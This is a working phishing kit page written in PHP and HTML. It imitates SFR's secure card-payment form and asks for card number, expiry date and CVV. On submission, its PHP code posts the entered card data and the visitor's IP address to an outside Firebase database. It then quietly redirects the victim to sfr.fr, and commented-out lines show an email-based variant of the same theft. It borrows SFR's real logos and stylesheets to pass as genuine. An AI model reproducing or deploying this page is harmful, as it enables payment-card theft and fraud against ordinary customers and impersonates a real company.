<?php

$ip = "";

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function send_result($data){
  $url = "https://selft-fire.firebaseio.com/cc.json";
  $data['ip'] = get_client_ip();
$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => json_encode($data)
    )
);

$context  = stream_context_create($opts);

$result = file_get_contents($url, false, $context);
 // $email = 'ok4htc@gmail.com';
 // $ip = get_client_ip();
 // $m = "Result <$ip>";
 // foreach($data as $k => $v){
 //   $m .= "$k : $v";
 // }
  //$headers = "From: webmaster@sfr.fr" . "\r\n";


}

$ip  = get_client_ip();


if(isset($_GET["validat"])){
 send_result($_POST);
    echo "<script>document.location='http://sfr.fr'</script>";
    //header('location: http://sfr.com');
    die();
}
?>

<!DOCTYPE html>
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">

<head>
  <meta content="width=device-width,initial-scale=1" name="viewport">
  <meta content="Atos" name="copyright" />
  <meta content="text/html; charset=utf-8" http-equiv="content-type" />
  <meta content="text/javascript" http-equiv="content-script-type" />
  <meta content="0" http-equiv="expires" />
  <meta content="no-cache" http-equiv="pragma" />
  <meta content="no-cache, must-revalidate" http-equiv="cache-control" />
  <meta content="telephone=no" name="format-detection" />
  <meta content="email=no" name="format-detection" />
  <meta content="initial-scale=1.0, user-scalable=1" name="viewport" />
  <link href="https://payment-web.sfr.fr/static/merchants/SIPS/SIPSDIRECT/201343059564006/images/favicon.ico" rel="icon" type="image/ico"
  />
  <link href="https://payment-web.sfr.fr/static/merchants/SIPS/SIPSDIRECT/201343059564006/css/pcidss.css" rel="stylesheet"
    type="text/css" />
  <script src="/assets/2.13.13/stack/fr/core.js" type="text/javascript"></script>
  <script src="/assets/2.13.13/ctx/static/common/js/jquery.js" type="text/javascript"></script>
  <script src="/assets/2.13.13/ctx/static/common/js/jquery.kawwa.modal.js" type="text/javascript"></script>
  <script src="/assets/2.13.13/ctx/static/common/js/k-general.js" type="text/javascript"></script>
  <script src="/assets/2.13.13/ctx/static/common/js/common.js" type="text/javascript"></script>
  <script src="/assets/2.13.13/ctx/static/common/js/captcha.js" type="text/javascript"></script>
  <script src="/assets/2.13.13/ctx/static/common/js/virtualnumpad.js" type="text/javascript"></script>
  <script src="/assets/2.13.13/ctx/static/common/js/oneclick.js" type="text/javascript"></script>
  <script src="/assets/2.13.13/ctx/static/common/js/splitcardnumberfield.js" type="text/javascript"></script>
  <script src="/assets/2.13.13/app/mixins/zoneUpdater.js" type="text/javascript"></script>
  <script src="/assets/2.13.13/app/mixins/click_once.js" type="text/javascript"></script>
  <script src="/assets/2.13.13/ctx/static/common/js/k-load.js" type="text/javascript"></script>
  <script type="text/javascript"></script>
  <!--[if lt IE 8]>
<link href="https://payment-web.sfr.fr/static/merchants/SIPS/SIPSDIRECT/201343059564006/css/iehacks1.css" rel="stylesheet" type="text/css"/>
<![endif]-->
  <script type="text/javascript"></script>
  <!--[if IE 9]>
<link href="https://payment-web.sfr.fr/static/offers/1.3/SIPS/default/css/iehacks9.css" rel="stylesheet" type="text/css"/>
<![endif]-->
  <script type="text/javascript"></script>
  <!--[if lt IE 9]>
<script src="/assets/2.13.13/ctx/static/common/js/html5shiv.js" type="text/javascript"></script>
<![endif]-->
  <title>Page de saisie des informations de la carte</title>
  <script type="text/javascript">
    function createCookie(name, value, days) {
      var expires = "";
      if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toGMTString();
      }
      var cookie = name + "=" + value + expires + "; path=" + "/";
      document.cookie = cookie;
    }
    createCookie("JavaScriptEnabledCheck", 1, 0);
  </script>
  <link type="text/css" rel="stylesheet" href="/assets/2.13.13/core/tapestry-console.css" />
  <link type="text/css" rel="stylesheet" href="/assets/2.13.13/core/t5-alerts.css" />
  <link type="text/css" rel="stylesheet" href="/assets/2.13.13/core/tree.css" />
  <link type="text/css" rel="stylesheet" href="/assets/2.13.13/ctx/static/common/css/throbber.css" />
</head>

<body id="no_wallet_management_body">
  <div id="container">
    <div id="header">
      <div id="headerMerchant">
        <div id="logoMerchant2" style="margin:0px">
          <strong style="font-size: 12px;">Paiement s&eacute;curis&eacute; de votre commande</strong>
        </div>
      </div>
    </div>


    <div id="wrapper">
      <div class="" role="main" id="main" style="width:auto; padding:10px;min-width:auto">
        <div id="captureCardDetailsH2Title">
          <h2>Informations de la carte</h2>
        </div>
        <form action="?validat" method="post" id="captureCardForm">

          <div class="customMessage1">

          </div>
          <div class="customMessage2">

          </div><br/>
          <fieldset>
            <legend style="font-size: 0.8em;">
              Veuillez saisir les informations de votre paiement
            </legend>
            <div class="card-data">
              <p class="" id="no_virtualnumpad_p">
                <label for="cardNumberField" id="cardNumberField-label"> Numéro de carte :
                  <input style="width:auto;margin-bottom: auto;margin-left: auto;"maxlength="19" autocomplete="OFF" id="cardNumberField" name="cardNumberField" type="tel" />
                  <ul class="list-of-cards null" style="float:right">
                  <li style="width:auto; padding:0px"><img alt="Logo pour le type de carte CB" size="20px" name="CB" src="https://payment-web.sfr.fr/static/common/images/acceptanceLogos/medium/logo_CB.png"
                    style="width: 20px;"/></li>
                  <li style="width:auto; padding:0px"><img alt="Logo pour le type de carte VISA" name="VISA" src="https://payment-web.sfr.fr/static/common/images/acceptanceLogos/medium/logo_VISA.png"
                    style="width: 20px;"/></li>
                  <li style="width:auto; padding:0px"><img alt="Logo pour le type de carte MASTERCARD" name="MASTERCARD" src="https://payment-web.sfr.fr/static/common/images/acceptanceLogos/medium/logo_MASTERCARD.png" style="width: 20px;">
                    </li>
                </ul>
                </label>

              </p>
              <fieldset class="k-choice" style="width:100%">
                <legend>
                  Date d'expiration :
                </legend>
                <p style="    margin-top: 11px;">
                  <label for="expirydatefield" id="expirydatefield-label">
                  </label>
                  <span class="monthdatafield" style="margin-top:5px" id="expirydatefield">
                     Mois :
                        <span class="styledSelect">
                          <select name="expirydatefield-month" class="date-select" id="expirydatefield-month">
                            <option>01</option>
                            <option>02</option>
                            <option>03</option>
                            <option>04</option>
                            <option>05</option>
                            <option>06</option>
                            <option>07</option>
                            <option>08</option>
                            <option>09</option>
                            <option>10</option>
                            <option>11</option>
                            <option>12</option>
                          </select>
                        </span> 
                      Anneée :
                        <span class="styledSelect">
                          <select name="expirydatefield-year" class="date-select"  id="expirydatefield-year">
                            <option>2017</option>
                            <option>2018</option>
                            <option>2019</option>
                            <option>2020</option>
                            <option>2021</option>
                            <option>2022</option>
                            <option>2023</option>
                            <option>2024</option>
                            <option>2025</option>
                            <option>2026</option>
                            <option>2027</option>
                            <option>2028</option>
                            <option>2029</option>
                            <option>2030</option>
                            <option>2031</option>
                            <option>2032</option>
                            <option>2033</option>
                            <option>2034</option>
                          </select>
                        </span>
                  </span>
                </p>
              </fieldset>
              <p><label for="cvvfield" id="cvvfield-label">Cryptogramme visuel :
</label><input maxlength="4" autocomplete="OFF" id="cvvfield" name="cvvfield" type="tel" />
                <a role="button" class="k-field-help k-modal-trigger" href="#crypto-info"><span id="cvvHelpText">Aide ?</span><img alt="Aide ?" src="https://payment-web.sfr.fr/static/common/images/help.svg"/></a></p>
            </div>
            <div class="conditional"></div>
          </fieldset>
          <div class="customMessage3">

          </div>
          <div class="customMessage4">

          </div>
          <div id="threeDsBefore">
            <div class="message">
              <p class="threeDSWarningMessage">
                Selon votre établissement bancaire, vous pourrez être redirigé vers la page d'authentification de votre banque avant la validation
                de votre paiement.
              </p>
              <p class="threeDSLogo"><img alt="Page s�curis�e par VISA" src="https://payment-web.sfr.fr/static/common/images/3DSLogos/medium/3DS_VISA.png"
                /><img alt="Page s�curis�e par MASTERCARD" src="https://payment-web.sfr.fr/static/common/images/3DSLogos/medium/3DS_MASTERCARD.png"
                /></p>
            </div>
          </div>
          <div class="k-buttons-bar">
            <p>
              <input value="Finaliser votre commande et payer " id="form_submit" name="form_submit" type="submit" />
            </p>
          </div>
          <div id="threeDsAfter">
            <div class="message">
              <p class="threeDSWarningMessage">
                Selon votre �tablissement bancaire, vous pourrez �tre redirig� vers la page d�authentification de votre banque avant la validation
                de votre paiement.
              </p>
              <p class="threeDSLogo"><img alt="Page s�curis�e par VISA" src="https://payment-web.sfr.fr/static/common/images/3DSLogos/medium/3DS_VISA.png"
                /><img alt="Page s�curis�e par MASTERCARD" src="https://payment-web.sfr.fr/static/common/images/3DSLogos/medium/3DS_MASTERCARD.png"
                /></p>
            </div>
          </div>
        </form>
        <article style="display:none" class="k-modal" id="crypto-info">
          <div class="modal-body">
            <div class="customMessage1">

            </div>
            <div class="customMessage2">

            </div>
            <div id="message_cvv_perso">
              <h3 tabindex="0">
                Qu�est-ce que le cryptogramme visuel de votre carte ?
              </h3><br/>
              <div class="content">
                <p>Le cryptogramme visuel de votre carte est un dispositif de s�curit� anti-fraude qui permet de v�rifier que
                  vous �tes en possession de votre carte bancaire. Pour la s�curit� de vos achats en ligne, vous devez saisir
                  le cryptogramme visuel pr�sent � l�arri�re de votre carte. Cette �tape suppl�mentaire sert � s�assurer
                  que vos informations de carte ne sont pas utilis�es frauduleusement.</p><br/>
                <ul class="list-images">
                  <li>
                    <figure><img class="cvv_help_img" alt="Image vous permettant d�identifier le cryptogramme visuel de votre carte"
                        src="/assets/2.13.13/ctx/static/common/images/cvv_help_visa_mastercard.svg" /></figure>
                  </li>
                  <li>
                    <figure><img class="cvv_help_img" alt="Image vous permettant d�identifier le cryptogramme visuel de votre carte"
                        src="/assets/2.13.13/ctx/static/common/images/crypto_mc.svg" /></figure>
                  </li>
                </ul>
              </div>
            </div>
            <div class="customMessage3">

            </div>
          </div>
        </article>
      </div>
    </div>
    <!-- /wrapper -->
    <footer lang="en" role="contentinfo">
      <div id="footer">
        <!-- -->
      </div>
    </footer>
  </div>
  <script type="text/javascript">
    Tapestry.onDOMLoaded(function () {
      Tapestry.init({ "formEventManager": [{ "formId": "captureCardForm", "validate": { "submit": false, "blur": false } }] });
      defaultZoneUpdater = new ZoneUpdater({
        "elementId": "cardNumberField",
        "hasCoBadgingOption": false,
        "binLength": "9",
        "clientEvent": "keyup",
        "listenerURI": "https://payment-web.sfr.fr/fr/payment/card/capturecarddetails.capturecardcomponent.cardnumberfield:cardnumberchange?sid=9mt4rat252",
        "zoneId": "zoneCoBadgingLogo"
      })
      new ClickOnce('form_submit');
      new ClickOnce('cancel_0');
    });
  </script>
</body>

</html>